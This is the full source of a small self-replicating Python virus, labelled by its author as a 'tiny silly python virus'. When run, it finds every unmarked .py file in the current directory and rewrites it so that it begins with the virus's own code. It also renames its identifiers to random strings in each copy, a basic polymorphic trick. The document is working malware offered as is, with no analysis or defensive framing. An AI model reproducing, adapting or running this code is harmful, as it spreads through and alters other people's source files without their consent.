# MAGIC_CODE_SKD2835
import os
import __main__
import random

def infect(filename):
	os.rename(filename, filename + '~')
	destination = open(filename, 'w')
	source = open(filename + '~', 'r')
	this = open(__main__.__file__, 'r')

	mutations = init_mutation()

	for line in this:
		destination.write(mutate(line, mutations))
		if line.startswith("# MAGIC_CODE_SKD2835MDB"):
			break

	for line in source:
		destination.write(line)

	source.close()
	destination.close()
	this.close()

# So this infection will randomly change function/values related to keyworkds
def init_mutation():
	original = ["filename", "find_and_infect_files", "init_mutation", \
	"source", "is_infected", "infect", "rand_string", "original", "mutations"]
	mutated = []
	for o in original:
		mutated.append((o, rand_string(len(o))))
	return dict(mutated)

def mutate(line, mutations):
	for k, v in mutations.iteritems():
		line = line.replace(k, v);
	return line;

def rand_string(length):
	randstring = ""
	for i in range(0, length):
		randstring += chr(random.randint(97, 122))
	return randstring

def is_infected(filename):
	f = open(filename, 'r')
	return f.readline().startswith("# MAGIC_CODE_SKD2835")

def find_and_infect_files():
	path = '.'
	dirs = os.listdir(path)
	for filename in dirs:
		if filename.endswith('.py') and not is_infected(filename):
			infect(filename)

find_and_infect_files()
print('---Tiny silly python virus---')
# MAGIC_CODE_SKD2835MDB
# 
# This line should not be written into file
#
# TBC
